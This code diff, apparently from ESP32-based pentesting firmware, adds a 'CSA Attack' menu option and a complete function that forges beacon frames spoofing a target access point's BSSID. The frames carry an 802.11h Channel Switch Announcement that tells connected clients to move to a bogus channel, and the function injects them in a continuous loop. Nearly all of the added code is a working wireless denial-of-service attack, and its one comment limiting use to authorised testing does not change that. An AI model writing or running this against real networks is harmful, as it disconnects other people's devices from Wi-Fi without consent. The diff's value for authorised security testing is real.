@@ -722,6 +722,7 @@ AGAIN:
     options = {
         {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
         {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
+        {"CSA Attack",          [=]() { csa_atk(tssid, channel); }                 },
 #ifndef LITE_VERSION
         {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
 #endif
@@ -820,6 +821,131 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             }
             needsRedraw = true;
         }
+    }
+
+    wifi_atk_unsetWifi();
+    returnToMenu = true;
+}
+
+/***************************************************************************************
+** function: csa_atk
+** @brief: Channel Switch Announcement attack. Injects spoofed beacons (from the
+**         target AP's BSSID) carrying an 802.11h CSA element, telling associated
+**         clients to switch to a bogus channel where the AP isn't - knocking them
+**         off. Authorized-testing use only. Adjust the destination channel live
+**         with Prev/Next; Esc stops.
+***************************************************************************************/
+void csa_atk(String tssid, uint8_t channel) {
+    resetGlobalState();
+    cleanlyStopWebUiForWiFiFeature();
+    if (!wifi_atk_setWifi()) return;
+
+    uint8_t opCh = channel;
+    int destCh = (opCh <= 7) ? 13 : 1; // where clients get kicked to (far from the AP)
+
+    // Assemble a CSA beacon spoofing the target AP.
+    uint8_t ssidLen = tssid.length();
+    if (ssidLen > 32) ssidLen = 32;
+    uint8_t frame[128];
+    size_t n = 0;
+    frame[n++] = 0x80;
+    frame[n++] = 0x00; // Frame Control: management / beacon
+    frame[n++] = 0x00;
+    frame[n++] = 0x00;                             // Duration
+    for (int i = 0; i < 6; i++) frame[n++] = 0xFF; // DA: broadcast
+    memcpy(&frame[n], ap_record.bssid, 6);
+    n += 6; // SA: target BSSID
+    memcpy(&frame[n], ap_record.bssid, 6);
+    n += 6; // BSSID
+    frame[n++] = 0x00;
+    frame[n++] = 0x00; // Seq/Frag
+    for (int i = 0; i < 8; i++) frame[n++] = 0x00; // Timestamp
+    frame[n++] = 0x64;
+    frame[n++] = 0x00; // Beacon interval (100 TU)
+    frame[n++] = 0x01;
+    frame[n++] = 0x04; // Capability info (ESS)
+    frame[n++] = 0x00;
+    frame[n++] = ssidLen; // SSID element
+    memcpy(&frame[n], tssid.c_str(), ssidLen);
+    n += ssidLen;
+    frame[n++] = 0x01;
+    frame[n++] = 0x08; // Supported rates (8)
+    frame[n++] = 0x82;
+    frame[n++] = 0x84;
+    frame[n++] = 0x8b;
+    frame[n++] = 0x96;
+    frame[n++] = 0x24;
+    frame[n++] = 0x30;
+    frame[n++] = 0x48;
+    frame[n++] = 0x6c;
+    frame[n++] = 0x03;
+    frame[n++] = 0x01;
+    frame[n++] = opCh; // DS Parameter Set (current channel)
+    frame[n++] = 0x25;
+    frame[n++] = 0x03;         // CSA element (tag 37, len 3)
+    frame[n++] = 0x01;         // Channel Switch Mode = 1 (client stops TX until switch)
+    size_t csaChanOff = n;     // patched live if the operator changes the destination
+    frame[n++] = (uint8_t)destCh; // New Channel Number
+    size_t csaCountOff = n;
+    frame[n++] = 0x03; // Channel Switch Count (beacons until switch)
+    size_t frameLen = n;
+
+    esp_wifi_set_channel(opCh, WIFI_SECOND_CHAN_NONE);
+
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setTextSize(FM);
+    setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
+
+    bool needsRedraw = true;
+    uint32_t frameCount = 0, lastUpdate = millis(), lastCountTick = millis();
+    uint8_t swCount = 3;
+    check(EscPress);
+    check(SelPress);
+
+    while (!check(EscPress)) {
+        if (needsRedraw) {
+            drawMainBorderWithTitle("CSA Attack");
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            padprintln("");
+            padprintln("AP: " + tssid);
+            padprintln("Op channel: " + String(opCh));
+            padprintln("-> kick to ch: " + String(destCh));
+            padprintln("");
+            padprintln("Prev/Next: dest  Esc: stop");
+            needsRedraw = false;
+        }
+
+        // Count down ~every 100 ms so clients see a coherent switch countdown.
+        if (millis() - lastCountTick > 100) {
+            lastCountTick = millis();
+            swCount = (swCount == 0) ? 3 : swCount - 1;
+            frame[csaCountOff] = swCount;
+        }
+        frame[csaChanOff] = (uint8_t)destCh;
+
+        esp_wifi_80211_tx(WIFI_IF_AP, frame, frameLen, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, frame, frameLen, false);
+        frameCount += 2;
+
+        if (check(PrevPress)) {
+            destCh = (destCh <= 1) ? 14 : destCh - 1;
+            needsRedraw = true;
+        }
+        if (check(NextPress)) {
+            destCh = (destCh >= 14) ? 1 : destCh + 1;
+            needsRedraw = true;
+        }
+
+        if (millis() - lastUpdate >= 2000) {
+            float fps = frameCount * 1000.0 / (millis() - lastUpdate);
+            uint16_t statusX = tftWidth * 0.05;
+            uint16_t statusY = tftHeight - (tftHeight * 0.08);
+            tft.setCursor(statusX, statusY);
+            tft.print("Frames: " + String((int)fps) + "/s   ");
+            frameCount = 0;
+            lastUpdate = millis();
+        }
+        vTaskDelay(2 / portTICK_PERIOD_MS);
     }
 
     wifi_atk_unsetWifi();
